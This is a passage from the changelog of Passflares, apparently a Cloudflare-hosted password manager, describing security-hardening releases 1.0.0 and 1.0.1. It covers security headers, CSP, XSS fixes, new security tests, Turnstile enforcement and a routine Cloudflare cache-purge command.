  missing/expired/tampered JWT, mass-assignment on `/api/users/me/preferences`,
  prototype pollution, path traversal, behavioural SQL-injection probe,
  loose login-timing check, and oversize-body handling.
- `tests/e2e/security-headers-live.spec.ts` — opt-in Playwright spec that
  probes the deployed site (`LIVE_HOST=https://passflares.pierrefouquet.co.uk
  npx playwright test security-headers-live`) and asserts every public path
  carries CSP, HSTS, `X-Content-Type-Options`, `Referrer-Policy`,
  `X-Frame-Options`, and `Permissions-Policy`. Skipped when `LIVE_HOST` is
  unset so offline CI still passes.
- Extra assertions in `tests/backend/worker-security.test.ts`: HSTS
  `max-age` ≥ 7,776,000 with `preload`; HTML CSP names every directive
  (`default-src`, `script-src`, `style-src`, `img-src`, `font-src`,
  `connect-src`, `frame-src`, `manifest-src`, `base-uri`, `object-src`,
  `form-action`, `frame-ancestors`); `script-src` rejects `'unsafe-eval'`,
  `*`, and `data:`; no `X-Powered-By` is emitted; base security headers
  also land on JS, font, and image responses.
- `SECURITY.md` now notes that `/cdn-cgi/*` is Cloudflare-managed edge
  infrastructure and is intentionally out of scope for this repo.

### Deployment notes

- After deploy, Cloudflare may still serve the previous header-less
  responses from edge cache. Purge via the Cloudflare dashboard
  (Caching → Configuration → Purge Everything) or the API:

  ```sh
  curl -X POST \
    "https://api.cloudflare.com/client/v4/zones/<zone_id>/purge_cache" \
    -H "Authorization: Bearer <token>" \
    -H "Content-Type: application/json" \
    --data '{"purge_everything":true}'
  ```

## [1.0.1] — 2026-05-26

Security hardening release following an external Pentest-Tools Light scan
against `passflares.pierrefouquet.co.uk`. The scan flagged seven low-severity
findings, all of which were misconfiguration / missing-defence-in-depth
issues — no exploitable vulnerabilities were reported. This release addresses
every confirmed finding and mitigates the one unconfirmed false-positive.

### Added

- `public/.well-known/security.txt` so external researchers have a
  discoverable channel for vulnerability reports (closes the scanner's
  "Security.txt file is missing" finding).
- Backend tests (`tests/backend/worker-security.test.ts`) asserting that
  every static-page response carries HSTS, `X-Content-Type-Options`,
  `Referrer-Policy`, and a CSP with `base-uri`, `object-src 'none'`,
  `form-action`, and `frame-ancestors`. Catches future regressions.
- Static-analysis guardrail tests (`tests/backend/code-security-invariants.test.ts`)
  that grep `src/` for risky patterns ruled out during the 1.0.1 review:
  no `eval` / `new Function`, every `DB.prepare()` uses a static string
  literal (no template interpolation, no concatenation), and every `fetch()`
  in worker code targets a constant URL or string literal — never a
  user-controlled value. Failing means a regression has re-introduced one
  of those patterns.
- Regression tests (`tests/frontend/dialog-xss.test.js`) covering the
  dialog XSS fix below — both the title and confirmDialog message round-
  trip as text, not HTML.
- Static-content tests (`tests/backend/static-content.test.ts`) asserting
  `security.txt` carries the required RFC 9116 fields with a future
  `Expires`, that `index.html` has no inline `<script>` blocks or
  duplicated `<meta>` CSP, and that the auth forms declare `method="post"`.

### Changed

- Security headers (HSTS, `X-Content-Type-Options`, `Referrer-Policy`,
  `Permissions-Policy`, `X-Frame-Options`, `Content-Security-Policy`) are
  now sent on every response, not just `/api/*`. Previously the static
  HTML/JS/CSS responses had none of them, which is what the external
  scanner picked up.
- CSP for HTML pages tightened: added `base-uri 'self'`, `object-src 'none'`,
  `form-action 'self'`, `frame-ancestors 'none'`. The `<meta>` CSP in
  `public/index.html` was removed — the worker is now the single source of
  truth so the policy can't drift between the header and the tag.
- API responses now carry a deny-by-default CSP (`default-src 'none'`) since
  JSON endpoints should never load any subresource.
- HSTS bumped to include the `preload` directive.
- `handleDeleteAccount` in `src/auth.ts` no longer builds a
  `DELETE … WHERE id IN (?, ?, …)` statement via template-literal
  interpolation. It now prepares a single literal `DELETE … WHERE id = ?`
  and runs the per-vault deletes via `env.DB.batch()`. Functionally
  equivalent and satisfies the static-analysis guardrail above.
- The router error fallback (`public/js/router.js`) builds its error state
  through DOM APIs instead of `innerHTML`, so any `err.message` derived
  from API or user data cannot inject markup into the error view.
- The app-bar brand SVG in `public/js/main.js` is parsed via `DOMParser`
  (`image/svg+xml`) and inserted with `replaceChildren`, mirroring the
  pattern already used in the auth screen. Removes a same-origin `innerHTML`
  path for SVG content.

### Fixed

- Dialog title and `confirmDialog` message are now rendered with
  `textContent`, not HTML interpolation. Callers that pass vault, entry,
  or organisation names (any user-controlled string) into a dialog can no
  longer smuggle markup or executing payloads through the modal — closes
  a stored-XSS vector reachable via shared vaults and org membership.
- `openDialog` no longer crashes with a TDZ `ReferenceError` when the
  caller awaits `closedPromise`. The close-resolver is captured in a
  local `let` before the promise is constructed, instead of being
  attached to an `api` object that hadn't been declared yet.
- `ensureRoot()` in `public/js/dialog.js` re-fetches `#dialog-root` when
  the cached reference is no longer attached to `document.body`, so the
  dialog manager survives test setup that resets `document.body.innerHTML`
  between cases (and any future page mount that detaches the host).
- Login and register forms now declare `method="post"` explicitly. They are
  still handled in JavaScript with `preventDefault`, so behaviour is
  unchanged, but the explicit method clears the scanner's
  "Password Submitted in URL" heuristic (the form previously defaulted to
  `GET`, which the scanner flags even when JS intercepts the submit).

## [1.0.0] — 2026-05-23

First stable release. Marks the end of the 1.x/2.x beta line as the codebase
has settled around the Cloudflare Workers + R2 + D1 + KV architecture, with a
mature feature set across personal vaults, organisations, sharing, and
preferences sync.

### Added

- Server-side Turnstile verification on `/api/register` and `/api/login`. A
  missing or invalid token now blocks sign-in and account creation (previously
  the widget was rendered but never checked).
- Per-IP rate limit on `/api/register` (5 attempts / 15 minutes), mirroring
  the existing `/api/login` lockout.
- `production` branch as the explicit release target — `main` is the
  integration branch; Cloudflare's GitHub integration deploys only when
  `main` is fast-forwarded into `production`. New `npm run release` script
  automates the merge.
- `wrangler.toml.example` with placeholder IDs and setup instructions so
  forkers can self-host without colliding with the upstream maintainer's
  Cloudflare resources.
- Unit tests for `verifyTurnstile`, plus auth-handler tests covering missing
  tokens, failed verification, and register rate-limit lockout.
- Playwright specs confirming the Ctrl+K shortcut hint and command palette
  keyboard footer are hidden on mobile viewports and shown on desktop.

### Changed

- Mobile (≤ 860px) no longer renders the Ctrl+K / `↑ ↓ Enter Esc` keyboard
  hints in the search bar or command palette — desktop behaviour unchanged.
- `Content-Security-Policy` on `public/index.html` no longer allows
  `'unsafe-inline'` for `script-src`. The pre-paint theme bootstrap is now
  served from `public/js/prefs-bootstrap.js`.
- Brand-mark SVG is parsed via `DOMParser` instead of `innerHTML` in the
  auth screen.
- `ALLOWED_ORIGINS` in `src/worker.ts` dropped the leftover
  `prerelease.passflares.*` host that was orphaned when the prerelease
  environment was removed.

### Removed

- Debug `console.log` calls from `public/js/session.js`. Error/warn paths
  remain.

### Fixed

- Empty `try { … } catch {}` blocks in `public/js/prefs.js` now carry a
  one-line comment naming the swallowed condition (localStorage quota,
  listener safety, corrupt cache).

### Security

- Turnstile is now genuinely enforced (see Added).
- CSP tightened (see Changed).
- Master password continues to be transmitted only inside the TLS tunnel
  (HSTS `max-age=31536000`) and never stored server-side; only its scrypt
  hash is persisted in D1. Vault contents are encrypted client-side with
  AES-256-GCM before they ever leave the browser. None of this changed in
  1.0 — it's restated here for completeness on the milestone release.

### Known follow-ups (not blocking 1.0)

- JWT session tokens live in `localStorage`. Mitigated by 5-minute inactivity
  timeout and 1-hour server-side expiry; future work: move to an HttpOnly
  cookie.
- Local-dev origins (`localhost:8080`, `localhost:5173`) remain in
  `ALLOWED_ORIGINS`. They cannot be exploited because browsers enforce the
  `Origin` header, but a future change could gate them on an environment
  variable for cleanliness.

[1.0.1]: https://github.com/PierreFouquet/Passflares/releases/tag/v1.0.1
[1.0.0]: https://github.com/PierreFouquet/Passflares/releases/tag/v1.0.0
